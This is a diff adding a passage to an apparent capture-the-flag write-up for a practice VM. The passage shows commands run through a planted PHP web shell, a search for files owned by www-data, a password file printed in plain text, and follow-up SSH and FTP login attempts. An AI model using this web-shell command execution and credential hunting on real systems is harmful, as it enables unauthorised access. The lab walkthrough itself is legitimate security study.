@@ -207,3 +207,43 @@ dovenull:x:109:65534:Dovecot login user,,,:/nonexistent:/bin/false
 postfix:x:110:118::/var/spool/postfix:/bin/false
 ```
 
+We can look now for all the files our current user has created:
+
+```bash
+└─$ curl -k https://192.168.1.22/forum/templates_c/curl_shell.php?cmd=find+/+-user+www-data+\|head+-10
+/home
+/home/LOOKATME
+/home/LOOKATME/password
+/proc/1288
+/proc/1288/task
+/proc/1288/task/1288
+/proc/1288/task/1288/fd
+/proc/1288/task/1288/fd/0
+/proc/1288/task/1288/fd/1
+/proc/1288/task/1288/fd/2
+```
+There is a folder written `LOOKATME` and a file `password`:
+
+```bash
+└─$ curl -k https://192.168.1.22/forum/templates_c/curl_shell.php?cmd=cat+/home/LOOKATME/password
+lmezard:G!@M6f4Eatau{sF"
+```
+
+Password of lmezard : `G!@M6f4Eatau{sF"`
+
+We can now try to connect in ssh to our VM.
+```bash
+└─$ ssh lmezard@192.168.1.22
+        ____                _______    _____
+       |  _ \              |__   __|  / ____|
+       | |_) | ___  _ __ _ __ | | ___| (___   ___  ___
+       |  _ < / _ \| '__| '_ \| |/ _ \\___ \ / _ \/ __|
+       | |_) | (_) | |  | | | | | (_) |___) |  __/ (__
+       |____/ \___/|_|  |_| |_|_|\___/_____/ \___|\___|
+
+                       Good luck & Have fun
+lmezard@192.168.1.22's password:
+Permission denied, please try again.
+```
+too bad, let's try again with the `ssh` port finded with nmap before, it's not working neither...
+Let's try with the `ftp` port 21 with an external software and `lmezard` credential. It's working !! Now we have access to a file `README` and `fun`. The readme file say that we have to resolve the puzzle to get the password for the user `laurie`.
